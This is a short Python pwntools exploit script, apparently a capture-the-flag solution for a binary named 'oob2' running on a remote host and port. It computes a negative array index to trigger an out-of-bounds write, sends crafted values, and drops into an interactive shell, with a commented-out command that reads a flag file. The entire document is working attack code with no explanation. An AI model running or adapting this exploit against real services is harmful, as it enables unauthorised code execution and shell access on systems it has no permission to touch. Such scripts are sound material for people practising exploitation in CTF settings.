#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './oob2'
LIBC = ''
HOST = '140.110.112.77'
PORT = 3112

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

offset = (0x6010C0 - 0x6010A0) // 8
#input()
r.sendline(str(-1*offset)) # ID
r.send(str(1111111))
r.sendline(str(123))

r.sendline(str(0))
r.send('ABCDEFG')
r.sendline(str(0x31313131))
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
